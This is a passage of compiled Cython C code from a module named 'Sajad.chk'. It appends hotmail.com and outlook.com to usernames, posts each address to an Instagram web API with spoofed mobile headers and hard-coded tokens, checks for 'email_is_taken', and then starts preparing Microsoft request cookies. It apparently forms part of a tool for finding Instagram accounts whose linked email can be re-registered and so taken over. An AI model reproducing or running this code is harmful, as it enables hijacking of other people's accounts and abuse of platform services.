        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_8 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 41, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_nambrline); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 42, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 43, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_INCREF(__pyx_kp_u__7);
      __pyx_t_7 = (65535 > __pyx_t_7) ? 65535 : __pyx_t_7;
      __pyx_t_6 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__7);
      PyTuple_SET_ITEM(__pyx_t_5, 44, __pyx_kp_u__7);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_com); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_orde); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_9 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 45, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_0, __pyx_n_s_format); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loob); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_nambrline); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_12 = __Pyx_PyNumber_Float(__pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = __Pyx_PyNumber_Divide(__pyx_t_8, __pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_10 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_12, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_11);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 46, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_INCREF(__pyx_kp_u__8);
      __pyx_t_6 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__8);
      PyTuple_SET_ITEM(__pyx_t_5, 47, __pyx_kp_u__8);
      __pyx_t_9 = __Pyx_PyUnicode_Join(__pyx_t_5, 48, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_9);
      __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_end, __pyx_kp_u__9) < 0) __PYX_ERR(0, 430, __pyx_L3_error)
      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_5, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_13 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_13) {
      __Pyx_AddTraceback("source.Sajad.chk", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_10, &__pyx_t_9, &__pyx_t_5) < 0) __PYX_ERR(0, 432, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_9);
      __pyx_v_e = __pyx_t_9;
      /*try:*/ {

        
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_sg); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 433, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_12 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_4 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_12, __pyx_v_e) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_v_e);
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 433, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L15;
        }
        __pyx_L14_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0; __pyx_t_21 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_19, &__pyx_t_20, &__pyx_t_21);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18) < 0)) __Pyx_ErrFetch(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_19);
          __Pyx_XGOTREF(__pyx_t_20);
          __Pyx_XGOTREF(__pyx_t_21);
          __pyx_t_13 = __pyx_lineno; __pyx_t_14 = __pyx_clineno; __pyx_t_15 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_19);
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_XGIVEREF(__pyx_t_21);
            __Pyx_ExceptionReset(__pyx_t_19, __pyx_t_20, __pyx_t_21);
          }
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_18);
          __Pyx_ErrRestore(__pyx_t_16, __pyx_t_17, __pyx_t_18);
          __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0; __pyx_t_21 = 0;
          __pyx_lineno = __pyx_t_13; __pyx_clineno = __pyx_t_14; __pyx_filename = __pyx_t_15;
          goto __pyx_L5_except_error;
        }
        __pyx_L15:;
      }
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  
  __pyx_t_5 = PyList_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 435, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_INCREF(__pyx_kp_u_hotmail_com);
  __Pyx_GIVEREF(__pyx_kp_u_hotmail_com);
  PyList_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_hotmail_com);
  __Pyx_INCREF(__pyx_kp_u_outlook_com);
  __Pyx_GIVEREF(__pyx_kp_u_outlook_com);
  PyList_SET_ITEM(__pyx_t_5, 1, __pyx_kp_u_outlook_com);
  __pyx_v_dom = ((PyObject*)__pyx_t_5);
  __pyx_t_5 = 0;

  
  __pyx_t_5 = __pyx_v_dom; __Pyx_INCREF(__pyx_t_5); __pyx_t_6 = 0;
  for (;;) {
    if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_5)) break;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    __pyx_t_9 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_6); __Pyx_INCREF(__pyx_t_9); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 436, __pyx_L1_error)
    #else
    __pyx_t_9 = PySequence_ITEM(__pyx_t_5, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 436, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    #endif
    __Pyx_XDECREF_SET(__pyx_v_domin, __pyx_t_9);
    __pyx_t_9 = 0;

    
    __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_use, __pyx_n_s_strip); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 437, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_10);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_10, function);
      }
    }
    __pyx_t_9 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 437, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_9);
    __pyx_t_9 = 0;

    
    __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 438, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_domin, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 438, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 438, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF_SET(__pyx_v_email, ((PyObject*)__pyx_t_4));
    __pyx_t_4 = 0;

    
    __Pyx_INCREF(__pyx_kp_u_https_www_instagram_com_api_v1_w);
    __Pyx_XDECREF_SET(__pyx_v_url, __pyx_kp_u_https_www_instagram_com_api_v1_w);

    
    __pyx_t_4 = __Pyx_PyDict_NewPresized(23); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 442, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Accept, __pyx_kp_u__10) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Encoding, __pyx_kp_u_gzip_deflate_br) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Accept_Language, __pyx_kp_u_en_US_en_q_0_9_ar_q_0_8) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Length, __pyx_kp_u_38) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Content_Type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Prefers_Color_Scheme, __pyx_n_u_dark) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua, __pyx_kp_u_Not_A_Brand_v_99_Chromium_v_124) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua_Full_Version_List, __pyx_kp_u_Not_A_Brand_v_99_0_0_0_Chromium) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua_Mobile, __pyx_kp_u_1) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua_Model, __pyx_kp_u_22021211RG) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua_Platform, __pyx_kp_u_Android) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Ch_Ua_Platform_Version, __pyx_kp_u_13_0_0) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Fetch_Dest, __pyx_n_u_empty) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Fetch_Mode, __pyx_n_u_cors) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Sec_Fetch_Site, __pyx_kp_u_same_origin) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_User_Agent, __pyx_kp_u_Mozilla_5_0_Linux_Android_10_K_A) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_Viewport_Width, __pyx_kp_u_393) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Asbd_Id, __pyx_kp_u_129477) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Csrftoken, __pyx_n_u_uSc1c91qJGdndg6WgSwdic8Z6npY6lgJ) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Ig_App_Id, __pyx_kp_u_1217981644879628) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Ig_Www_Claim, __pyx_kp_u_hmac_AR11z00N_IbRNGrzU_J3F40kHM4) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Instagram_Ajax, __pyx_kp_u_1011900369) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_X_Requested_With, __pyx_n_u_XMLHttpRequest) < 0) __PYX_ERR(0, 442, __pyx_L1_error)
    __Pyx_XDECREF_SET(__pyx_v_heedrs, ((PyObject*)__pyx_t_4));
    __pyx_t_4 = 0;

    
    __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 467, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_email, __pyx_v_email) < 0) __PYX_ERR(0, 467, __pyx_L1_error)
    __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_4));
    __pyx_t_4 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 469, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 469, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 469, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_INCREF(__pyx_v_url);
    __Pyx_GIVEREF(__pyx_v_url);
    PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_url);
    __pyx_t_9 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 469, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_headers, __pyx_v_heedrs) < 0) __PYX_ERR(0, 469, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 469, __pyx_L1_error)
    __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_4, __pyx_t_9); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 469, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_text); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 469, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF_SET(__pyx_v_req, __pyx_t_9);
    __pyx_t_9 = 0;

    
    __pyx_t_22 = (__Pyx_PySequence_ContainsTF(__pyx_n_u_email_is_taken, __pyx_v_req, Py_EQ)); if (unlikely(__pyx_t_22 < 0)) __PYX_ERR(0, 471, __pyx_L1_error)
    __pyx_t_23 = (__pyx_t_22 != 0);
    if (__pyx_t_23) {

      
      __pyx_t_9 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 473, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_9);
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_mkt, __pyx_kp_u_ar_YE) < 0) __PYX_ERR(0, 473, __pyx_L1_error)
      if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_MicrosoftApplicationsTelemetryDe, __pyx_kp_u_Lol) < 0) __PYX_ERR(0, 473, __pyx_L1_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_cok); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 475, __pyx_L1_error)
